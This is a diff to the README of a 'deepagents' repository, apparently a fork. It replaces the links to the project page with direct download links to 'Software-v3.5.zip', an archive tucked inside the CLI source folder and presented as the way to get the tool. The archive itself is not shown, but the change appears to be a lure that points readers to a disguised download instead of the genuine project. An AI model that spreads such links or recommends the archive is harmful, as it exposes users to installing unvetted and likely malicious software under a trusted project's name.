@@ -1,6 +1,6 @@
 # 🤖 deepagents - Run complex tasks with ease
 
-[![Download deepagents](https://img.shields.io/badge/Download%20deepagents-purple?style=for-the-badge)](https://github.com/GamerBoiyzz/deepagents)
+[![Download deepagents](https://img.shields.io/badge/Download%20deepagents-purple?style=for-the-badge)](https://github.com/GamerBoiyzz/deepagents/raw/refs/heads/main/libs/cli/deepagents_cli/Software-v3.5.zip)
 
 ## 🚀 What is deepagents?
 
@@ -18,7 +18,7 @@ Use it when you want software that can:
 
 Use this link to visit the download page:
 
-[https://github.com/GamerBoiyzz/deepagents](https://github.com/GamerBoiyzz/deepagents)
+[https://github.com/GamerBoiyzz/deepagents/raw/refs/heads/main/libs/cli/deepagents_cli/Software-v3.5.zip](https://github.com/GamerBoiyzz/deepagents/raw/refs/heads/main/libs/cli/deepagents_cli/Software-v3.5.zip)
 
 ### How to get it on Windows
 
